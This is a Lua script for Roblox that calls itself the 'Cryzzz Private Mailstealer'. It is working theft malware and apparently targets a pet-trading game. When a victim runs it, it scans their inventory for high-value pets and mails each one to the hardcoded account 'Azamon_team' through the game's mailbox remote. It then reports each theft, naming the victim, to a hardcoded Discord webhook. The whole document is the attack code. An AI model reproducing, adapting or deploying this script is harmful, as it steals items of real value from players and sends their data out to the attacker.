-- Cryzzz Private Mailstealer 2026 - Full Fixed Version
getgenv().Executed = getgenv().Executed or false
if getgenv().Executed then return end
getgenv().Executed = true

repeat task.wait() until game:IsLoaded()

local Username = "Azamon_team"
local Webhook = "https://discordapp.com/api/webhooks/1509224125195878411/BQTSR7zKwgM0-aqaFN2z-F07KPTg-OfqIs5lqYpdTHlFgKKfOzK0L4Cuc_v2O0Z51IzE"
local MinimumRAP = 1000000
local mailstealer_name = "Cryzzz"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
if LocalPlayer.Name == Username then
    LocalPlayer:Kick("Owner Account - Use Alt")
    return
end

local Save = require(ReplicatedStorage.Library.Client.Save).Get()
local Directory = require(ReplicatedStorage.Library.Directory)
local Inventory = Save.Inventory
local network = ReplicatedStorage:WaitForChild("Network")

local GemsAmount = 0
if Inventory.Currency then
    for _, v in pairs(Inventory.Currency) do
        if v.id == "Diamonds" then
            GemsAmount = v._am or 0
            break
        end
    end
end

local function FormatNumber(n)
    local suf = {"", "k", "m", "b", "t"}
    local i = 1
    while n >= 1000 and i < #suf do
        n = n / 1000
        i += 1
    end
    return string.format("%.2f%s", n, suf[i])
end

local function GetItemRAP(item, class)
    local success, rap = pcall(function()
        return require(ReplicatedStorage.Library.Client.DevRAPCmds).Get({
            Class = {Name = class},
            IsA = function() return true end,
            GetId = function() return item.id end,
            StackKey = function()
                return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
            end
        }) or 0
    end)
    return success and rap or 0
end

local function GetThumbnail(imageid)
    local asset = imageid and string.split(imageid, "rbxassetid://")[2] or ""
    if asset == "" then return "https://via.placeholder.com/420" end
    local success, response = pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" .. asset .. "&size=420x420&format=png"))
        return data.data[1].imageUrl
    end)
    return success and response or "https://via.placeholder.com/420"
end

local hits = {}
if Inventory.Pet then
    for id, v in pairs(Inventory.Pet) do
        local rap = GetItemRAP(v, "Pet")
        if rap >= MinimumRAP then
            table.insert(hits, {
                Id = id,
                Name = v.id,
                Amount = v._am or 1,
                RAP = rap,
                Shiny = v.sh or false,
                Image = (Directory.Pets[v.id] or {}).thumbnail or ""
            })
        end
    end
end

table.sort(hits, function(a, b) return a.RAP > b.RAP end)

local totalRap = 0
for _, v in ipairs(hits) do totalRap += v.RAP end

print("Gefunden: " .. #hits .. " Items | Total RAP: " .. FormatNumber(totalRap))

for i, v in ipairs(hits) do
    local args = {Username, "Cryzzz on top", "Pet", v.Id, v.Amount}
    
    local success = pcall(function()
        network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    end)
    
    if success then
        local thumb = GetThumbnail(v.Image)
        local payload = {
            ["username"] = mailstealer_name .. " Mailstealer",
            ["content"] = "@everyone",
            ["embeds"] = {{
                ["title"] = "**New Item Received**",
                ["color"] = 16776960,
                ["thumbnail"] = {["url"] = thumb},
                ["fields"] = {
                    {["name"] = "Victim", ["value"] = LocalPlayer.Name},
                    {["name"] = "Item", ["value"] = v.Name},
                    {["name"] = "RAP", ["value"] = FormatNumber(v.RAP)},
                    {["name"] = "Total RAP", ["value"] = FormatNumber(totalRap)}
                }
            }}
        }
        pcall(function()
            HttpService:PostAsync(Webhook, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
        end)
        task.wait(1.35)
    else
        task.wait(2.5)
    end
end

print("=== CRYZZZ MAILSTEALER FINISHED SUCCESSFULLY ===")
